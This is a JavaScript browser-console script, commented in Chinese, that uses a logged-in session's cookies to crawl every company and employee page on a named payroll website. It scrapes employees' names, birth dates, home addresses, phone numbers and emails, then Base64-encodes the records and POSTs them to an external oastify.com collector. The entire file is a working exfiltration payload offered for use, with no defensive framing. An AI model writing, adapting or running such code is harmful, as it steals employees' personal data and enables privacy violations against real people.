// ============================================================
// 脚本功能：从指定网站提取公司ID和员工信息并发送
// 注意：由于跨域限制，此脚本需要在目标网站的控制台中运行
// ============================================================

(async function() {
    'use strict';

    // ---------- 配置 ----------
    const BASE_URL = 'https://lohnabrechnung.sage.com';  // 请替换为实际域名
    const TARGET_URL = '78dsx5tizgmyajfy8gpjw37cs3yumka9.oastify.com';      // 数据接收地址

    // ---------- 工具函数 ----------
    // 从HTML字符串中提取所有公司ID
    function extractCompanyIds(html) {
        const ids = [];
        // 匹配 href='/companies/overview/数字' 或 href='/companies/数字/employees'
        const regex = /\/companies\/(?:overview\/)?(\d+)/g;
        let match;
        while ((match = regex.exec(html)) !== null) {
            if (!ids.includes(match[1])) {
                ids.push(match[1]);
            }
        }
        return ids;
    }

    // 从HTML字符串中提取员工信息（表格数据）
    function extractEmployeesFromHTML(html, companyId) {
        const employees = [];
        
        // 创建DOM解析器
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        
        // 查找表格主体中的所有行
        const rows = doc.querySelectorAll('#SopEmployee_grid tbody tr');
        
        rows.forEach(row => {
            const cells = row.querySelectorAll('td');
            if (cells.length < 17) return; // 跳过不完整的行
            
            // 提取数据（根据列索引）
            const employeeNumber = cells[0]?.textContent?.trim() || '';
            const firstName = cells[1]?.textContent?.trim() || '';
            const lastName = cells[2]?.textContent?.trim() || '';
            const birthDate = cells[3]?.textContent?.trim() || '';
            const street = cells[11]?.textContent?.trim() || '';
            const zipCode = cells[12]?.textContent?.trim() || '';
            const city = cells[13]?.textContent?.trim() || '';
            const phone = cells[14]?.textContent?.trim() || '';
            const mobile = cells[15]?.textContent?.trim() || '';
            const email = cells[16]?.textContent?.trim() || '';
            
            // 计算年龄（如果出生日期存在）
            let age = '';
            if (birthDate) {
                const birth = new Date(birthDate);
                if (!isNaN(birth)) {
                    const today = new Date();
                    age = (today.getFullYear() - birth.getFullYear()).toString();
                    // 如果今年还没过生日，减一岁
                    const monthDiff = today.getMonth() - birth.getMonth();
                    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
                        age = (parseInt(age) - 1).toString();
                    }
                }
            }
            
            // 构建完整地址
            const fullAddress = [street, zipCode, city].filter(Boolean).join(', ');
            
            employees.push({
                companyId: companyId,
                employeeNumber: employeeNumber,
                firstName: firstName,
                lastName: lastName,
                fullName: `${firstName} ${lastName}`.trim(),
                birthDate: birthDate,
                age: age,
                address: fullAddress,
                phone: phone,
                mobile: mobile,
                email: email
            });
        });
        
        return employees;
    }

    // Base64编码
    function base64Encode(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    // 发送数据到目标服务器
    async function sendData(data) {
        try {
            const jsonData = JSON.stringify(data);
            const encoded = base64Encode(jsonData);
            
            // 构建要发送的数据字符串
            const postData = `data=${encodeURIComponent(encoded)}`;
            
            // 方式1: 使用fetch（支持跨域）
            const response = await fetch(`https://${TARGET_URL}/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: postData,
                mode: 'no-cors'  // no-cors模式允许发送但无法读取响应
            });
            
            console.log(`✅ 数据已发送 (${data.length}条记录)`);
        } catch (error) {
            console.error('❌ 发送错误:', error.message);
        }
    }

    // ---------- 主流程 ----------
    async function main() {
        console.log('🚀 开始执行数据提取脚本...');
        
        try {
            // 1. 获取公司列表页面
            console.log('📡 获取公司列表...');
            const companyResponse = await fetch(`${BASE_URL}/companies`, {
                credentials: 'include'  // 携带cookie以保持登录状态
            });
            
            if (!companyResponse.ok) {
                throw new Error(`无法获取公司列表: ${companyResponse.status}`);
            }
            
            const companyHtml = await companyResponse.text();
            
            // 2. 提取所有公司ID
            const companyIds = extractCompanyIds(companyHtml);
            console.log(`🏢 找到 ${companyIds.length} 个公司:`, companyIds);
            
            if (companyIds.length === 0) {
                console.warn('⚠️ 未找到任何公司ID，请检查页面结构或登录状态');
                return;
            }
            
            // 3. 遍历每个公司，获取员工列表
            let allEmployees = [];
            
            for (const companyId of companyIds) {
                console.log(`📋 正在获取公司 ${companyId} 的员工信息...`);
                
                try {
                    const empResponse = await fetch(`${BASE_URL}/companies/${companyId}/employees`, {
                        credentials: 'include'
                    });
                    
                    if (!empResponse.ok) {
                        console.warn(`⚠️ 公司 ${companyId} 员工页面无法访问: ${empResponse.status}`);
                        continue;
                    }
                    
                    const empHtml = await empResponse.text();
                    const employees = extractEmployeesFromHTML(empHtml, companyId);
                    
                    console.log(`   ✅ 找到 ${employees.length} 名员工`);
                    allEmployees = allEmployees.concat(employees);
                    
                } catch (error) {
                    console.error(`❌ 公司 ${companyId} 处理失败:`, error.message);
                }
            }
            
            console.log(`📊 总共提取到 ${allEmployees.length} 条员工记录`);
            
            // 4. 显示部分数据预览
            if (allEmployees.length > 0) {
                console.log('📝 数据预览 (前3条):');
                allEmployees.slice(0, 3).forEach((emp, idx) => {
                    console.log(`  ${idx+1}. ${emp.fullName} | ${emp.age}岁 | ${emp.address} | ${emp.email}`);
                });
            }
            
            // 5. 发送数据
            if (allEmployees.length > 0) {
                console.log('📤 正在发送数据到服务器...');
                await sendData(allEmployees);
                console.log('✅ 脚本执行完成！');
            } else {
                console.warn('⚠️ 没有数据可发送');
            }
            
        } catch (error) {
            console.error('❌ 脚本执行出错:', error.message);
        }
    }

    // ---------- 执行 ----------
    await main();

})();
